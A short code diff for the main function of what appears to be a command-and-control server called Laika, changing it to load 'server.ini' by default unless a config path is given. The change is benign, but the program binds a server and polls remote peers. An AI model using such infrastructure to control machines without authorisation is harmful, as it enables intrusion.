@@ -43,16 +43,21 @@ bool loadConfig(struct sLaika_cnc *cnc, char *config) {
 
 int main(int argv, char *argc[]) {
     struct sLaika_cnc *cnc;
+    char *configFile = "server.ini";
 
     printf("Laika v" MACROLITSTR(LAIKA_VERSION_MAJOR) "." MACROLITSTR(LAIKA_VERSION_MINOR) "-" LAIKA_VERSION_COMMIT "\n");
-
     cnc = laikaC_newCNC(atoi(LAIKA_CNC_PORT));
+
     /* load config file */
-    if (argv >= 2 && !loadConfig(cnc, argc[1]))
+    if (argv >= 2)
+        configFile = argc[1];
+
+    if (!loadConfig(cnc, configFile))
         return 1;
 
     laikaT_initTaskService(&tService);
 
+    /* start cnc */
     laikaC_bindServer(cnc);
     while (true) {
         laikaC_pollPeers(cnc, laikaT_timeTillTask(&tService));
